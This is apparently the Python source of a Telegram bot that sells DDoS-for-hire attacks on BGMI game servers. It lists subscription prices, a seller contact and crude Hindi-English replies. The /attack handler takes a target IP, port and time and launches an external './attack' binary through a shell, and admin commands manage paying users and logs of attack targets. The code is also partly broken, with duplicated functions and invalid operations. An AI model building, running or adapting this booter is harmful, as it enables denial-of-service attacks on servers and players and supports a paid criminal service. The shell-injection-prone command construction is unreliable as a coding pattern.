#!/usr/bin/python3/attack/User-vip-bot/free/stop/STOPALL
import telebot,telebot
import subprocess
import requests
import datetime
import os
  

# insert your Telegram bot token here
bot = telebot.TeleBot('')

# Admin user IDs
admin_id = [""]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    free_user_credits = [] 
    try:
        with open("FREE_USER_FILE", "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip(): 
# Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        "free_user_credits"[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        return []


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, IP , port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nIP: {IP}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "SAB CLEAR HO GYA✅"
    except FileNotFoundError:
        response = "KUCH NI H AB✅."
    return response

# Function to record command logs
def record_command_logs(user_id, command, ip =None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if ip:
        log_entry += f" | Target: {ip}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "SB KUCH ACHE SE DHAAL. .BHAI PAHLI BAR H KYA😂'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} ADD HO GYA H BHAI 🔥ab feedback ni diya to 🤬 {duration} {time_unit}. TERA TIME KHATAM HOGA {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "BHAI SAHI SE ADD KR LE YR."
            else:
                response = "BHAI WO PHLE HI ADD H KYA KR RA TOO 🤦‍♂️."
        else:
            response = "BHAI ADD KRNA NHI AATA KYA LODE🤬 (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "SALE TOO KAREGA ADD SAKAL DEKHI H APNI MUTTHAL😂."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")




@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} GAND MAR LI BHAI TERI 🖕."
            else:
                response = f"User {user_to_remove} LIST SE GYA AB TOO ❌."
        else:
            response = '''MAR GAND PE LAAT🦵. 
✅ Usage: /remove <userid>😘'''
    else:
        response = "AB TOO HATAYEGA SALE PHLE APNA NUNU SAMBHAL LE DANG SE 😜."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "SB UDA DIYA. No data found ❌."
                else:
                    file.truncate(0)
                    response = "SAB UD GYA✅"
        except FileNotFoundError:
            response = "PHLE HI UD GYA ❌."
    else:
        response = "GAND MAR LI JAYEGI FALTOO BACKCHODI KRI TO 😡."
    bot.reply_to(message, response)



@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "KYA DEKH RA KOI NI BACHA H BHAI AB 🤣❌."
                else:
                    file.truncate(0)
                    response = "SBKI GAND MAR LI🖕 ✅"
        except FileNotFoundError:
            response = "SBKO HATA CHUKA H BHAI ❌."
    else:
        response = "BHAI TOO THODA SA BHN KA LODA H KYA ?😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "KOI BAAKI RH GYA KYA ❌"
        except FileNotFoundError:
            response = "GALTI SE BACH GYA RE TOO ❌"
    else:
        response = "TOO NHI DEKH PAYEGA LODE 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "CHUTIYA AB TOO KAREGA ADD BHG BNCHOD😡."
        bot.reply_to(message, response)

# Dictionary to stop ongoing attacks, keyed by user ID
ongoing_attacks={}
stop_ongoing_attacks=[]
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in ongoing_attacks:
            # Terminate the ongoing attack process
            ongoing_attacks[user_id].terminate()
            del ongoing_attacks[user_id]  # Remove from ongoing attacks dictionary
            response = "ARE BHNCHOD ROKA KU LODE✅."
        else:
            response = "ROKNA NHI THA BHNCHOD🔥."
    else:
        response = "ROKA KU MADERCHOD😡."
    
    bot.reply_to(message, response)

# Modify the function to start an attack to store the ongoing attack process
def start_attack_reply(message ,IP, PORT, TIME):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        response = "BHAI PAHLE DEKH KYA KR RA TOO CHUTIYE KHAREED LE NA 😡."
        bot.reply_to(message, response)
        return

    if user_id in ongoing_attacks:
        response = "You already have an ongoing attack. Please stop it before starting a new one ❌."
        bot.reply_to(message, response)
        return

    # Start the attack process
    full_command = f"./attack {IP} {PORT} {TIME} 300"
    ongoing_attacks[user_id] = subprocess.Popen(full_command, shell=True)
    response = f"🚀ATTACK LAG GYA BHAI GAME KI PING DEKH🚀\TARGET🎯: {IP}\PORT💥: {PORT}\TIME🔥: {TIME} Seconds\Method:🔥AB OFFLINE 💫BANDEY MAROONGA🤪"
    bot.reply_to(message, response)

# Modify the function to finish an attack to remove the ongoing attack process
def finish_attack_reply(message, IP, PORT, TIME):
    user_id = str(message.chat.id)
    if user_id in ongoing_attacks:
        del ongoing_attacks[user_id]  # Remove the ongoing attack process
    response = f"🚀SERVER CHUD GYA🚀\IP: {IP}\Port: {PORT}\Time: {TIME} Seconds\Method: VIP-BGMI-UDP"
    bot.reply_to(message, response)

# Command handler for stopping all ongoing attacks by admin
stopall_ongoing_attacks={}
@bot.message_handler(commands=['STOPALL'])
def stop_all_attacks(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Iterate through ongoing attacks and terminate each process
        for user_id, attack_process in ongoing_attacks.items():
            attack_process.terminate()
        # Clear the ongoing attacks dictionary
        ongoing_attacks.clear()
        ongoing_attacks.clear=[]
        response = "BHN K LODE ROKA KU🚀 ✅."
    else:
        response = "O BHAI OR KUCH KAM NI H KYA LODE 😡."
    
    bot.reply_to(message, response)





# Modify the function to finish an attack to remove the ongoing attack process
def finish_attack_reply(message, IP, PORT, TIME):
    user_id = str(message.chat.id)
    if user_id in ongoing_attacks:
        del ongoing_attacks[user_id]  # Remove the ongoing attack process
    response = f"🚀ATTACK🚀 KHATAM HO GYA BHAI🚀 {IP}\Port: {PORT}\nime: {TIME} Seconds\Method: VIP-BGMI-UDP"
    bot.reply_to(message, response)



# Function to handle the reply when the attack is finished
def finish_attack_reply(message, IP, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀ATTACK🚀 KHATAM HO GYA BHAI🚀\n\nIP: {IP}\nPort: {port}\nTime: {time} Seconds\nMethod: VIP-BGMI-UDP"
    bot.reply_to(message, response)


# Handler for /bgmi command
attack_cooldown={}
COOLDOWN_TIME=10
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < 10:
                response = "OI HEERO🖕RUK JA ❌.10sec  BHI INTJAR NI HOTA KYA LODE 🤬/attack  10 SEC  BAD LAGEGA ."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            attack_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            IP = command[1]
            PORT = int(command[2])  # Convert time to integer
            TIME = int(command[3])  # Convert port to integer
            if TIME > 300:
                response = "BHAI 🕚300sec KA TIME H TOO KYA CHAHTA H MATACH KHATM PLANE M HI CHUTIYA🤬."
            else:
                record_command_logs(user_id, '/attack', IP, PORT, TIME)
                log_command(user_id, IP, PORT, TIME)
                start_attack_reply(message, IP, PORT, TIME)  # Call start_attack_reply function
                full_command = f"./attack {IP} {PORT} {TIME} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI🚀ATTACK KHATM HO GYA🚀.TARGET🔥: {IP} PORT💫: {PORT} TIME💥: {TIME} 🚀CHL AB BANDEY MAR NOOB😅"
        else:
            response = "✅DEKH KYA RA🤣IP PORT DAAL JALDI🕚:- 🚀/attack🚀 <PAHLE IP🚀>💥<FIR PORT🚀>🖕<AB TIME🕚>🔥 FIR JAYEGA SERVER LODU💥"  # Updated command syntax
    else:
        response = "🚫 BHAI KHAREED LE PHLE 💸 \FIR KAREGA KAM🚀 \👉 FALTOO MSG MTKR BOT KO\💸 KHAREEDNA H TO BAT KR💸✅"
    
    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "PAHLE KHAREEDNLE BHAI FIR KARNA YE SB 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 BOL BHAI DDOS CHAHIYE KYA✅SOCH MAT BHAI LE LE :
💥 /attack : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.
💥 /stop : TO STOP ONGOING ATTACKS
🗝️ To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Jisko khareedna h dm kro💸 :- @PRIYA_TG
YE Mera chennel h join kr lo sb  :- https://t.me/+a58zYz6ZW4Q1NWY1
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''BOL BHAI DDOS CHAHIYE  KYA 😅, {user_name}ABHI SASTA H KHAREED LE .
🤖Try To Run This Command : /help 
✅Join :- https://t.me/+a58zYz6ZW4Q1NWY1'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} RULE DEKH LO BHAI BOT IKDAM MST CHALEGA⚠️:

         💥💥EASY KILLS 🔥🔥50 to 🔥🔥70🚀🚀
1. BOT K SATH MASTI NI !! WARNA BOT BND HO JAYEGA ⚠️:
2. 1🚀ATTACK KAFI H SARE BNDEY OFFLINE MILENGEY ✅
3. CHENNEL JOIN KR LO🔥 https://t.me/+a58zYz6ZW4Q1NWY1 WARNA BOT OFF📴 HO JAYEGA
4. BAAKI SB SAFE ✅ H GHANTA BHI BAN NI HOGA KOI'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name},BHAI LENA HOGA TO HI MSG KRNA BAAKI BOT IKDAM GANDFAAD🔥 H 💯!!:

Vip 🌟 :INSTENT SERVER JAYEGA BHAI.SOCH MT LE LE💥.
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

PRICE THIK H KOI MAHENGA H MT BOLNA✅

Pr-ice List💸 :
Day-->150 Rs मात्र 
Week-->700 Rs मात्र 
Month-->1500 Rs मात्र 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
💥 /STOPALL : STOP ALL ATTACKS THAT ARE RUNNING.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "KU UNGLI KR RA BOT K 😡."

    bot.reply_to(message, response)



bot.polling()